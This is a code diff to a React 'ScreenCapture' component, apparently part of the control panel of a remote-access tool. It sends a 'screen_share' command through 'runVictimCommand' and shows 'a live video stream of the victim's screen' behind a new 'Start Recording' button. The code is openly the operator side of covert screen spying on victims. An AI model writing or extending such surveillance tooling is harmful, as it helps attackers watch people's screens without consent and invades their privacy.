@@ -1,12 +1,13 @@
-import React, { useEffect, useRef } from "react";
+import React, { useEffect, useRef, useState } from "react";
 import { runVictimCommand } from "../../../service/api.service";
 import { useLocation } from "react-router-dom";
 
 const ScreenCapture: React.FC = () => {
+  const [clientId, setClientId] = useState<number>(0); // [1]
   const location = useLocation();
   const videoRef = useRef<HTMLVideoElement | null>(null);
 
-  useEffect(() => {
+  const handleClick = () => {
     // Define the video source URL (replace with your actual URL)
     const startBroadcast = async () => {
       const hash = location.hash;
@@ -15,11 +16,12 @@ const ScreenCapture: React.FC = () => {
       const match = hash.match(/id=([^&]+)/);
 
       if (match) {
+        setClientId(parseInt(match[1] || "0"));
         // Extract the 'id' value from the matched result
         const clientId = match[1];
 
         const response = await runVictimCommand(
-          clientId,
+          parseInt(clientId),
           "screen_share",
           "function"
         );
@@ -28,7 +30,8 @@ const ScreenCapture: React.FC = () => {
       }
     };
     startBroadcast();
-    const videoSourceUrl = "http://localhost:8080";
+    const videoSourceUrl =
+      "http://localhost:8080/clients/" + clientId + "/screenshare";
 
     // Check if the video element exists
     if (videoRef.current) {
@@ -40,25 +43,29 @@ const ScreenCapture: React.FC = () => {
         console.error("Error playing video:", error);
       });
     }
-  }, []);
+  };
 
   return (
     <div>
       <h1 className="text-2xl font-bold mb-4">Screen Capture</h1>
+      <p className="text-gray-600 mb-4">
+        This is a live video stream of the victim's screen.
+      </p>
+      <div className="flex flex-row items-center">
+        <button
+          className="bg-blue-500 hover:bg-blue-700 text-white font-bold py-2 px-4 rounded"
+          onClick={handleClick}
+        >
+          Start Recording
+        </button>
 
-      {/* Video Information */}
-      <div className="mb-4">
-        <p className="text-gray-600">Video Information:</p>
-        <ul className="list-disc list-inside">
-          <li>Resolution: 1920x1080</li>
-          <li>Frame Rate: 30 FPS</li>
-          <li>Codec: H.264</li>
-        </ul>
+        <button className="bg-blue-500 hover:bg-blue-700 text-white font-bold py-2 px-4 rounded ml-4">
+          Stop Recording
+        </button>
       </div>
 
       {/* Video Player */}
       <div>
-        <p className="text-gray-600">Live Video Stream:</p>
         <video
           ref={videoRef}
           className="w-full h-auto"
